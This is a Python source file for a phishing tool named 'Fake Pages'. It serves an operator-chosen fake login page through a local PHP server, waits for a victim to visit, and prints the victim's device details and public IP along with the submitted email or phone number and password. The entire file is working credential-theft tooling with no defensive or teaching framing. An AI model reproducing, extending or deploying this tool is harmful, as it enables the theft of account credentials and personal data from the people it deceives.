R = '\033[31m'  # red
G = '\033[32m'  # green
C = '\033[36m'  # cyan
W = '\033[0m'   # white
Y = '\033[33m'  # yellow

import sys
from os import path, kill
import argparse
from json import loads, decoder
import subprocess as subp
from time import sleep
import requests
from signal import SIGTERM
from ipaddress import ip_address

path_to_script = path.dirname(path.realpath(__file__))

parser = argparse.ArgumentParser()
parser.add_argument('-p', '--port', type=int, default=8080, help='Web server port [ Default : 8080 ]')
args = parser.parse_args()
port = args.port
PAGE = ''
SERVER = ''
INFO = f'{path_to_script}/logs/data.txt'
RESULT = f'{path_to_script}/logs/result.txt'
LOG_FILE = f'{path_to_script}/logs/php.log'



def banner():
    print()
    print(f'{R}-------------------------//---------------------------')
    print()
    print(f'{Y}[>] Name: {W}Fake Pages')
    print(f'{Y}[>] Created By: {W}Aristóteles F.')
    print(f'{Y}[>] Version: {W}1.0.0')
    print()
    print(f'{R}-------------------------//---------------------------')
    print()

def select_page(page):
    print(f'{Y}[!] Select a Template :{W}\n')
    PAGES_JSON = f'{path_to_script}/pages/pages.json'

    with open(PAGES_JSON, 'r') as templ:
        pages_info = templ.read()
    
    templ_json = loads(pages_info)
    for item in templ_json['templates']:
        name = item['name']
        print(f'{G}[{templ_json["templates"].index(item)}] {C}{name}{W}')
    try:
        selected = int(input(f'{G}[>] {W}'))
        if selected < 0:
            print()
            print(f'{R}[-] Invalid Input!')
            sys.exit()
    except ValueError:
        print()
        print(f'{R}[-] {C}Invalid Input!{W}')
        sys.exit()
    
    try:
        page = templ_json['templates'][selected]['dir_name']
    except IndexError:
        print()
        print(f'{R}[-] Invalid Input!')
        sys.exit()

    print()
    print(f'{G}[+] {C}Loading {Y}{templ_json["templates"][selected]["name"]} {C}Template...{W}')
    print(page)

    return page

def server():
    print()
  
    preoc = False
    print(f'{G}[+] {C}Port : {W}{port}\n')
    print(f'{G}[+] {C}Starting PHP Server...{W}', end='', flush=True)
    cmd = ['php', '-S', f'0.0.0.0:{port}', '-t', f'pages/{PAGE}/']

    with open(LOG_FILE, 'w+') as phplog:
        proc = subp.Popen(cmd, stdout=phplog, stderr=phplog)
        sleep(3)
        phplog.seek(0)
        if 'Address already in use' in phplog.readline():
            preoc = True
        try:
            php_rqst = requests.get(f'http://127.0.0.1:{port}/index.html')
            php_sc = php_rqst.status_code
            if php_sc == 200:
                if preoc:
                    print(f'{C}[ {G}✔{C} ]{W}')
                    print(f'{Y}[!] Server is already running!{W}')
                    print()
                else:
                    print(f'{C}[ {G}✔{C} ]{W}')
                    print()
            else:
                print(f'{C}[ {R}Status : {php_sc}{C} ]{W}')
                quit(proc)
        except requests.ConnectionError:
            print(f'{C}[ {R}✘{C} ]{W}')
            quit(proc)
    return proc


def wait():
    printed = False
    currentAccess = False
    data_row = []
    while True:
        sleep(2)
        size = path.getsize(RESULT)
        count = path.getsize(INFO)
        if count > 0 and currentAccess is False:
            with open(INFO, 'r') as accessdetails:
                accessdetails = accessdetails.read()
                currentAccess = True
            try:
                accessdetails = loads(accessdetails)
            except decoder.JSONDecodeError:
                print(f'{R}[-] {C}Exception : {R}{traceback.format_exc()}{W}')
                
            else:
                var_os = accessdetails['os']
                var_ip = accessdetails['ip']

                data_row.extend([var_os, var_ip])
                
                print(f'''{G}[!] -- Identified Access -- :{W}


                {G}[+] {C}OS         : {W}{var_os}
                {G}[+] {C}Public IP  : {W}{var_ip}
                ''')

        if size == 0 and printed is False:
            print(f'{G}[+] {C}Waiting for Target...{Y}[ctrl+c to exit]{W}\n')
            printed = True
        if size > 0:
            parsedata()
            printed = False

def parsedata():
    data_row = []
    with open(INFO, 'r') as infodetails:
        infodetails = infodetails.read()
        print(infodetails)
    try:
        info_json = loads(infodetails)
    except decoder.JSONDecodeError:
        print(f'{R}[-] {C}Exception : {R}{traceback.format_exc()}{W}')
    else:
        var_os = info_json['os']
        var_platform = info_json['platform']
        var_cores = info_json['cores']
        var_ram = info_json['ram']
        var_res = info_json['wd'] + 'x' + info_json['ht']
        var_browser = info_json['browser']
        var_ip = info_json['ip']

        data_row.extend([var_os, var_platform, var_cores, var_ram, var_res, var_browser, var_ip])

        print(f'''{Y}[!] Device Information :{W}

        {G}[+] {C}OS         : {W}{var_os}
        {G}[+] {C}Platform   : {W}{var_platform}
        {G}[+] {C}CPU Cores  : {W}{var_cores}
        {G}[+] {C}RAM        : {W}{var_ram}
        {G}[+] {C}Resolution : {W}{var_res}
        {G}[+] {C}Browser    : {W}{var_browser}
        {G}[+] {C}Public IP  : {W}{var_ip}
        ''')

    with open(RESULT, 'r') as resultdetails:
        results = resultdetails.read()
        try:
            result_json = loads(results)
        except decoder.JSONDecodeError:
            print(f'{R}[-] {C}Exception : {R}{traceback.format_exc()}{W}')
        else:
            var_emailOrPhone = result_json['emailOrPhone']
            var_password = result_json['password']

            data_row.extend([var_emailOrPhone, var_password])
            print(f'''{Y}[!] Account Details :{W}

            {G}[+] {C}Email/Phone  : {W}{var_emailOrPhone}
            {G}[+] {C}Password : {W}{var_password}
            ''')

    clearFiles()
    return
            
def clearFiles():
    with open(RESULT, 'w+'):
        pass
    with open(INFO, 'w+'):
        pass

def again():
    clearFiles()
    wait()

def quit(proc):
    clearFiles()
    if proc:
        kill(proc.pid, SIGTERM)
    sys.exit()
try:
    banner()
    clearFiles()
    PAGE = select_page(PAGE)
    SERVER = server()
    wait()
except KeyboardInterrupt:
    print(f'{R}[-] {C}Keyboard Interrupt.{W}')
    quit(SERVER)
else:
    again()